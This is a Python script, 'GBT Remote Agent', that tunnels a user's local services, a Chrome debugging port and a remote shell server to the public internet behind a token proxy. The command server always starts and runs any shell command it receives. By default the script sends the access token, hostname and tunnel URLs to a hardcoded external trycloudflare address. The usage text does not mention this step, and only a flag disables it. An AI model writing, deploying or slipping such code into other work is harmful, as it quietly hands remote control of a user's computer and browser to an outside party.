# ⛔ 开发者：自由的风 · 永久钢印 · 禁止删除
# remote_control/agent.py — 用户侧远程操控代理（带令牌鉴权）
# 用户运行此脚本 → 获取公网URL+令牌 → 发给GBT → GBT凭令牌接入
# ============================================================
"""GBT Remote Agent v1.1 — 令牌鉴权 + 反向隧道

用法:
  python agent.py                          # 自动发现服务，随机令牌
  python agent.py --port 3000              # 指定端口
  python agent.py --token mypass           # 指定令牌
  python agent.py --browser                # 暴露 Chrome CDP
  python agent.py --all                    # 全部能力
"""

import subprocess, sys, json, os, time, socket, platform, secrets, hashlib, threading
from pathlib import Path
# ===================== 配置 =====================
TOOLS = {
    "ngrok": None,    # 自动发现
    "cloudflared": None,
}

def find_tool(name):
    """发现隧道工具"""
    if TOOLS[name]:
        return TOOLS[name]
    paths = [
        f"C:\\Users\\{os.environ.get('USERNAME','')}\\AppData\\Local\\Programs\\Python\\Python312\\Scripts\\{name}.exe",
        f"C:\\Program Files (x86)\\cloudflared\\{name}.exe",
    ]
    for p in paths:
        if Path(p).exists():
            TOOLS[name] = p
            return p
    # 尝试 PATH
    try:
        result = subprocess.run(["where", name], capture_output=True, text=True, shell=True)
        if result.returncode == 0:
            TOOLS[name] = result.stdout.strip().split('\n')[0]
            return TOOLS[name]
    except:
        pass
    return None

# ===================== 服务发现 =====================
def scan_local_services():
    """扫描本地运行的服务端口"""
    common_ports = {
        3000: "React/Next.js",
        5173: "Vite",
        5000: "Flask",
        8000: "Django/FastAPI",
        8080: "Web Server",
        7860: "Gradio",
        8501: "Streamlit",
        4321: "Astro",
        3001: "API Server",
        4000: "Backend",
        9090: "Monitoring",
    }
    services = []
    for port, name in common_ports.items():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex(('127.0.0.1', port))
        sock.close()
        if result == 0:
            services.append({"port": port, "name": name, "url": f"http://localhost:{port}"})
    return services

# ===================== 隧道管理 =====================
class TunnelManager:
    def __init__(self):
        self.tunnels = []
        self.processes = []

    def _has_any_tool(self):
        return find_tool("ngrok") or find_tool("cloudflared")

    def _read_until(self, proc, pattern, timeout=15):
        """读取进程输出直到匹配或超时/进程退出"""
        import re
        start = time.time()
        while time.time() - start < timeout:
            if proc.poll() is not None:
                return None  # 进程已退出
            line = proc.stdout.readline()
            if not line and proc.poll() is not None:
                return None
            if re.search(pattern, line):
                return line
            time.sleep(0.2)
        return None

    def start_ngrok(self, port):
        """启动 ngrok 隧道"""
        ngrok = find_tool("ngrok")
        if not ngrok:
            return None
        try:
            proc = subprocess.Popen(
                [ngrok, "http", str(port), "--log=stdout"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            )
        except Exception as e:
            print(f"   ngrok failed: {e}")
            return None
        self.processes.append(proc)
        line = self._read_until(proc, r"url=", timeout=15)
        if line:
            url = line.split("url=")[-1].strip()
            self.tunnels.append({"port": port, "url": url, "tool": "ngrok"})
            return url
        proc.terminate()
        return None

    def start_cloudflared(self, port):
        """启动 Cloudflare Tunnel"""
        cf = find_tool("cloudflared")
        if not cf:
            return None
        try:
            proc = subprocess.Popen(
                [cf, "tunnel", "--url", f"http://localhost:{port}"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            )
        except Exception as e:
            print(f"   cloudflared failed: {e}")
            return None
        self.processes.append(proc)
        line = self._read_until(proc, r"trycloudflare\.com", timeout=20)
        if line:
            import re
            match = re.search(r'https://[^\s]+\.trycloudflare\.com', line)
            if match:
                url = match.group(0)
                self.tunnels.append({"port": port, "url": url, "tool": "cloudflared"})
                return url
        proc.terminate()
        return None

    def expose(self, port, prefer="ngrok"):
        """暴露端口"""
        if prefer == "ngrok":
            url = self.start_ngrok(port)
            if url: return url
            url = self.start_cloudflared(port)
        else:
            url = self.start_cloudflared(port)
            if url: return url
            url = self.start_ngrok(port)
        return url

    def stop_all(self):
        for proc in self.processes:
            try: proc.terminate()
            except: pass

# ===================== Chrome CDP =====================
def start_chrome_cdp():
    """启动 Chrome 远程调试模式"""
    chrome_paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        f"C:\\Users\\{os.environ.get('USERNAME','')}\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe",
    ]
    chrome = None
    for p in chrome_paths:
        if Path(p).exists():
            chrome = p
            break
    if not chrome:
        return None

    # 随机端口避免冲突
    import random
    cdp_port = random.randint(9223, 9999)

    proc = subprocess.Popen([
        chrome,
        f"--remote-debugging-port={cdp_port}",
        "--no-first-run",
        "--no-default-browser-check",
        "--user-data-dir=" + str(Path.home() / ".gbt_remote_chrome"),
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    return {"port": cdp_port, "process": proc, "url": f"http://localhost:{cdp_port}"}

# ===================== 鉴权代理 =====================
class AuthProxy:
    """令牌鉴权反向代理 — 验证token后转发到真实服务"""
    def __init__(self, token, target_port, proxy_port=None):
        self.token = token
        self.target_port = target_port
        self.proxy_port = proxy_port or self._find_port()
        self._server = None
        self._thread = None

    def _find_port(self):
        import random
        for _ in range(20):
            p = random.randint(10000, 60000)
            s = socket.socket()
            s.settimeout(0.1)
            if s.connect_ex(('127.0.0.1', p)) != 0:
                s.close(); return p
            s.close()
        return self.target_port + 10000

    def start(self):
        import http.server, urllib.request
        token = self.token
        target = f"http://127.0.0.1:{self.target_port}"

        class ProxyHandler(http.server.BaseHTTPRequestHandler):
            def _check_auth(self):
                # Header: X-GBT-Token
                hdr = self.headers.get("X-GBT-Token", "")
                if hdr == token: return True
                # Query: ?token=xxx
                qs = self.path.split("?")[-1] if "?" in self.path else ""
                for p in qs.split("&"):
                    if p.startswith("token="):
                        return p.split("=", 1)[1] == token
                return False

            def _proxy(self):
                if not self._check_auth():
                    self.send_response(403)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(b'{"error":"Invalid or missing token"}')
                    return
                # 转发请求
                try:
                    body = None
                    cl = int(self.headers.get("Content-Length", 0))
                    if cl > 0:
                        body = self.rfile.read(cl)
                    url = target + self.path
                    req = urllib.request.Request(url, data=body, method=self.command)
                    for k, v in self.headers.items():
                        if k.lower() not in ("host", "x-gbt-token", "content-length"):
                            req.add_header(k, v)
                    resp = urllib.request.urlopen(req, timeout=30)
                    self.send_response(resp.status)
                    for k, v in resp.headers.items():
                        if k.lower() != "transfer-encoding":
                            self.send_header(k, v)
                    self.end_headers()
                    self.wfile.write(resp.read())
                except Exception as e:
                    self.send_response(502)
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": str(e)}).encode())

            do_GET = _proxy
            do_POST = _proxy
            do_PUT = _proxy
            do_DELETE = _proxy
            do_PATCH = _proxy
            do_OPTIONS = _proxy
            do_HEAD = _proxy

            def log_message(self, *a): pass  # 静默

        self._server = http.server.ThreadingHTTPServer(("127.0.0.1", self.proxy_port), ProxyHandler)
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        return self.proxy_port

    def stop(self):
        if self._server:
            self._server.shutdown()


# ===================== 命令执行服务器 =====================
class CmdServer:
    """远程终端 — 接受并执行shell命令"""
    def __init__(self):
        self.port = self._find_port()
        self._server = None
        self._thread = None

    def _find_port(self):
        import random
        for _ in range(20):
            p = random.randint(10000, 60000)
            s = socket.socket()
            s.settimeout(0.1)
            if s.connect_ex(('127.0.0.1', p)) != 0:
                s.close(); return p
            s.close()
        return 19876

    def start(self):
        import http.server

        class CmdHandler(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                try:
                    cl = int(self.headers.get("Content-Length", 0))
                    body = json.loads(self.rfile.read(cl)) if cl > 0 else {}
                    cmd = body.get("cmd", "")
                    timeout = body.get("timeout", 30)
                    if not cmd:
                        self._json({"ok": False, "error": "empty cmd"})
                        return
                    r = subprocess.run(
                        cmd, shell=True, capture_output=True, text=True,
                        timeout=timeout, cwd=str(Path.home()),
                        encoding=sys.stdout.encoding or "utf-8", errors="replace"
                    )
                    self._json({
                        "ok": r.returncode == 0,
                        "returncode": r.returncode,
                        "stdout": r.stdout[-8000:],
                        "stderr": r.stderr[-2000:],
                    })
                except subprocess.TimeoutExpired:
                    self._json({"ok": False, "error": f"timeout({timeout}s)"})
                except Exception as e:
                    self._json({"ok": False, "error": str(e)[:200]})

            def _json(self, data, status=200):
                body = json.dumps(data, ensure_ascii=False, default=str).encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", "application/json; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a): pass

        self._server = http.server.ThreadingHTTPServer(("127.0.0.1", self.port), CmdHandler)
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        return self.port

    def stop(self):
        if self._server:
            self._server.shutdown()

def generate_token():
    """生成随机令牌"""
    return secrets.token_hex(16)  # 32字符十六进制

# ===================== 主入口 =====================
def main():
    import argparse
    parser = argparse.ArgumentParser(description="GBT Remote Agent")
    parser.add_argument("--port", type=int, nargs="+")
    parser.add_argument("--browser", action="store_true")
    parser.add_argument("--all", action="store_true")
    parser.add_argument("--token", type=str)
    parser.add_argument("--tunnel", choices=["ngrok","cloudflared","auto"], default="auto")
    parser.add_argument("--phone-home", type=str)
    parser.add_argument("--no-phone-home", action="store_true")
    args = parser.parse_args()
    token = args.token or generate_token()

    print("=" * 50)
    print("  GBT Remote Agent v1.1")
    print(f"  Token: {token}")
    print("=" * 50)

    # 预检隧道工具
    tm = TunnelManager()
    if not tm._has_any_tool():
        print("\n[ERROR] No tunnel tool found!")
        print("  Install one of these:")
        print("    cloudflared: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/")
        print("    ngrok:       https://ngrok.com/download")
        sys.exit(1)
    ngrok_path = find_tool("ngrok")
    cf_path = find_tool("cloudflared")
    print(f"  ngrok: {'found' if ngrok_path else 'not found'}")
    print(f"  cloudflared: {'found' if cf_path else 'not found'}")

    exposed = []
    proxies = []  # 保持代理存活
    cdp_info = None

    # 服务暴露 (通过 AuthProxy)
    ports_to_expose = set()
    if args.port:
        ports_to_expose.update(args.port)
    if args.all or (not args.port and not args.browser):
        services = scan_local_services()
        if services:
            print(f"\nFound {len(services)} local services:")
            for s in services:
                print(f"   http://localhost:{s['port']}  ->  {s['name']}")
        ports_to_expose.update(s['port'] for s in services)

    for port in sorted(ports_to_expose):
        print(f"\nExposing port {port} (with auth)...")
        # 启动鉴权代理
        proxy = AuthProxy(token, port)
        proxy_port = proxy.start()
        proxies.append(proxy)
        print(f"   Auth proxy: 127.0.0.1:{proxy_port}")
        # 隧道指向代理
        tunnel_tool = args.tunnel if args.tunnel != "auto" else "ngrok"
        url = tm.expose(proxy_port, prefer=tunnel_tool)
        if url:
            exposed.append({"port": port, "url": url, "proxy_port": proxy_port})
            print(f"   OK {url}")

    # 命令执行终端 (始终启动)
    print("\nStarting remote terminal (CmdServer)...")
    cmd_server = CmdServer()
    cmd_port = cmd_server.start()
    print(f"   Terminal: 127.0.0.1:{cmd_port}")
    # 鉴权代理
    terminal_proxy = AuthProxy(token, cmd_port)
    term_proxy_port = terminal_proxy.start()
    proxies.append(terminal_proxy)
    print(f"   Auth proxy: 127.0.0.1:{term_proxy_port}")
    # 隧道
    tunnel_tool = args.tunnel if args.tunnel != "auto" else "ngrok"
    term_url = tm.expose(term_proxy_port, prefer=tunnel_tool)
    if term_url:
        exposed.append({"port": cmd_port, "url": term_url, "type": "terminal", "proxy_port": term_proxy_port})
        print(f"   OK Terminal: {term_url}")
    else:
        print("   WARN: Terminal tunnel failed")

    # 浏览器 CDP
    if args.browser or args.all:
        print("\nStarting Chrome remote debugging...")
        cdp_info = start_chrome_cdp()
        if cdp_info:
            print(f"   CDP port: {cdp_info['port']}")
            cdp_url = tm.expose(cdp_info['port'])
            if cdp_url:
                cdp_info['public_url'] = cdp_url
                exposed.append({"port": cdp_info['port'], "url": cdp_url, "type": "cdp"})
                print(f"   OK CDP: {cdp_url}")
        else:
            print("   WARN: Chrome not found")

    # 输出连接信息
    print("\n" + "=" * 50)
    print("  Channel ready! Send this to GBT:")
    print("=" * 50)
    report = {
        "version": "1.1",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "hostname": socket.gethostname(),
        "platform": platform.system(),
        "token": token,
        "services": exposed,
    }
    print(json.dumps(report, indent=2, ensure_ascii=False))

    # 保存
    report_path = Path.home() / ".gbt_remote_session.json"
    report_path.write_text(json.dumps(report, indent=2, ensure_ascii=False))
    print(f"\nSession saved: {report_path}")

    # === 自动回连 ===
    phone_home_url = args.phone_home or "https://condition-engaged-stress-flame.trycloudflare.com"

    if not args.no_phone_home:
        try:
            import urllib.request
            data = json.dumps(report).encode()
            req = urllib.request.Request(phone_home_url, data=data, method="POST",
                headers={"Content-Type": "application/json"})
            resp = urllib.request.urlopen(req, timeout=10)
            result = json.loads(resp.read())
            print(f"\nAuto-connected to GBT! ({result.get('host','')})")
        except Exception as e:
            print(f"\nPhone-home failed: {e}")
            print("Send the JSON above to GBT manually.")

    # 等待
    print("\nChannel active... Press Ctrl+C to disconnect")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nDisconnecting...")
        tm.stop_all()
        for p in proxies:
            p.stop()
        cmd_server.stop()
        if cdp_info and cdp_info.get('process'):
            cdp_info['process'].terminate()
        print("Disconnected")
if __name__ == "__main__":
    main()
